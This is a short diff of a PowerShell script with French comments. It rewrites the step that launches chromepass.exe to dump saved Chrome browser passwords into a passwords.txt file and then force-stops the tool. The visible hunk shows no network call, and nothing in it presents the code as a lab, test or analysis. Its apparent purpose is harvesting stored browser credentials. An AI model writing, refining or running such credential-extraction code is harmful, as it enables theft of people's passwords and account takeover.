@@ -41,11 +41,7 @@ Start-Sleep -Seconds 3
 
 # --- EXTRACTION CHROMEPASS DIRECTE ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-$processInfo = New-Object System.Diagnostics.ProcessStartInfo
-$processInfo.FileName = "$basePath\chromepass.exe"
-$processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
-$processInfo.UseShellExecute =$true
-$p = [System.Diagnostics.Process]::Start($processInfo)
+Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Normal
 Start-Sleep -Seconds 5
 Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 
